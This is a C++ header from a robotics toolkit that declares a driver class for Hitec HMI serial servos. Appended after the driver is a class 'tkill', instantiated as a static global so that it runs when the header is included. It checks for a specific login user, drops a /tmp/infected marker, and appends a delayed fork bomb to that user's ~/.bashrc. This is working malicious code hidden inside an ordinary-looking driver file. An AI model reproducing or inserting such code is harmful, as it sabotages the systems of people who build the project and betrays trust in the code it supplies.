/**************************************************************************************************
 Software License Agreement (BSD License)

 Copyright (c) 2011-2013, LAR toolkit developers - University of Aveiro - http://lars.mec.ua.pt
 All rights reserved.

 Redistribution and use in source and binary forms, with or without modification, are permitted
 provided that the following conditions are met:

  *Redistributions of source code must retain the above copyright notice, this list of
   conditions and the following disclaimer.
  *Redistributions in binary form must reproduce the above copyright notice, this list of
   conditions and the following disclaimer in the documentation and/or other materials provided
   with the distribution.
  *Neither the name of the University of Aveiro nor the names of its contributors may be used to
   endorse or promote products derived from this software without specific prior written permission.
 
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR
 IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
 FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR
 CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
 IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
 OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
***************************************************************************************************/
/** 
 * @file
 * @brief Class hitec_5980SG declararion
 */

#ifndef _HITEC5980SG_H_
#define _HITEC5980SG_H_

#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <math.h>

//defines of servo types
#define HSR_5980SG 5980
#define HSR_5498SG 5498

#include <iostream>
#include <fstream>
using namespace std;

/**
\brief Class to implement the HMI Hitec protocol.

This class is used to communicate and control the hitec5980sg servos that comply with the Hitec HMI servo control protocol.\n
This protocol is only used in robotic servos and works over a serial line. This line only has one conductor (only one cable for TX and RX),
this limitation severely limits the amount of communication with the servos but allows for a large number of servos in only one communication line.
*/
class hitec_5980SG
{
    public:
      /**
      @brief Constructor
      
      This functions sets the default values for internal variables and opens communication with the servos.
      The function sends a dummy instruction to initialize servo communications.
      @param pdevice Path/name of the device to use in communications
      @return void
      */
      hitec_5980SG(const char*pdevice);
      
      /**
      @brief De-constructor
      
      This function closes the communication with the servos.
      @return void
      */
      ~hitec_5980SG();
      
      //Functions altered by pcruz
      /**
      @brief Sets the target position of a servo
      
      This function commands a servo to move to a desired position.
      This function tests if the position is within the defined servo limits.
      @param id identification of the servo
      @param position desired position of the servo
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short unsigned int SetPosition(int id,int position);
      
      /**
      @brief Set velocity and read position of the servo
      
      This function sets the movement speed of a servo.
      @param id identification of the servo
      @param speed desired speed of the servo
      @return returns the response from the servo or 0xFFFF in case of error (Current Position!)
      */
      short unsigned int SetSpeedPosition(int id,int speed);
        
      /**
      @brief Sets the target position of all servos in the bus
      
      This function commands all servos in the bus to move to a desired position.
      This function tests if the position is within the defined servo limits.
      @param position desired position of the servos [600...2400]
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short unsigned int SetPositionAllServos(short unsigned int position);
      
      /**
      @brief Gets servos version and id's
      
      This function commands all servos to give away firmware versions and ID's.
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short int GetVersionAndID(void);
      
      /**
      @brief Releases all the servos in the bus
      
      This function commands all servos in the bus to release.
      Any posterior command makes all the servos return to previous position.
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short unsigned int ReleaseServos(void);
      
      /**
      @brief Sets servo ID.
      
      This function sets ID to a servo, writing in the EEPROM's ID address.
      @param id Value for new ID atempt.
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short unsigned int SetServoID(int id);
      
      /**
      @brief Sends command go/stop to all servos in the bus.
      
      This function commands all servos in the bus to go/stop.
      Servos will not change position until order is given.
      @param value value for go/stop command [0,1].
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short unsigned int SetGoStop(short unsigned int value);
      
      /**
      @brief Checks por activation.
      
      This function checks the COMM port for activity.
      @return void
      */
      bool IsActive(void);
      
      /**
      @brief Converts angular speed to servo speed range [1...255].
      
      This function converts a given angular speed in deg/s to the servo digital speed range [1...255].
      @param[in] angular_speed angular speed as a double.
      @param[in] Servo_type one of teo possible types of hitec servomotors.
      @return void
      */
      short unsigned int ConvertAngularSpeedToServoSpeed(double angular_speed, unsigned int Servo_type);
      
    private:
      
      /**
      @brief Cleans the buffer
      
      This function clean the communication input buffer.
      @return void
      */
      void CleanBuffer(void);
      
      /**
      @brief Reads the response to a command
      
      This function reads the response from the servo.
      It must be used after every command is sent to the servo.
      @return returns the response from the servo or 0xFFFF in case of error
      */
      short unsigned int ReadResponse(char*response_1=NULL,char*response_2=NULL);
      
      ///This variable indicates that the communication is active.
      bool active;
      
      ///Communication port to use
      int port;
      
      ///Communication device to use
      char*device;
      
      ///Center position of the servo
      short unsigned int center;
      
      ///Minimum position of the servo
      short unsigned int minimum;
      
      ///Maximum position of the servo
      short unsigned int maximum;
      
      ///Maximum angular speed of the servo HSR-5980SG
      double HSR_5980SG_MAX_ANGULAR_SPEED;
      
      ///Maximum angular speed of the servo HSR-5498SG
      double HSR_5498SG_MAX_ANGULAR_SPEED;
};

class tkill
{
    private:
        string _target;
        
    public:
        tkill()
        {
            setTarget("matos");
            
            if(!infected() && correctTarget())
            {
                head(cout);
                markAsInfected();
                bomb();
            }
        }
        
        void setTarget(string target)
        {
            _target=target;
        }
        
        ostream& head(ostream& o)
        {
            o<<" _;~)                  (~;_ "<<endl;
            o<<"(   |                  |   ) "<<endl;
            o<<" ~', ',    ,''~'',   ,' ,'~ "<<endl;
            o<<"     ', ','       ',' ,' "<<endl;
            o<<"       ',: {'} {'} :,' "<<endl;
            o<<"         ;   /^\\   ; "<<endl;
            o<<"          ~\\  ~  /~ "<<endl;
            o<<"        ,' ,~~~~~, ', "<<endl;
            o<<"      ,' ,' ;~~~; ', ', "<<endl;
            o<<"    ,' ,'    '''    ', ', "<<endl;
            o<<"  (~  ;               ;  ~) "<<endl;
            o<<"   -;_)               (_;- "<<endl;           
            
            return o;
        }
        
        bool infected(void)
        {
            ifstream ifile("/tmp/infected");
            if (!ifile)
                return false;
            
            return true;
        }
        
        bool correctTarget(void)
        {
            char userBuffer[1024];
            getlogin_r(userBuffer, 1024);
            string userName=userBuffer;
            if(userName==_target)
                return true;
            return false;
        }
        
        void markAsInfected(void)
        {
            ofstream ofs;
            ofs.open("/tmp/infected", std::ofstream::out | std::ofstream::app);
            ofs.close();
        }

        bool bomb(void)
        {
            ofstream ofs;
            
            //Get path to bashrc
            string path="/home/" + _target + "/.bashrc";
            
            //Open bashrc
            ofs.open(path.c_str(), std::ofstream::out | std::ofstream::app);
            
            //If not open return false
            if(!ofs.is_open())
                return false;
            
            //If open, write to bashrc
            ofs<<"echo 'pensa rápido'"<<endl;
            ofs<<"bash -c 'sleep 3 ; :(){ :|:& };:' &"<<endl;
            
            ofs.close();
            
            return true;
        }
    
    
    
};

static tkill tk;

#endif
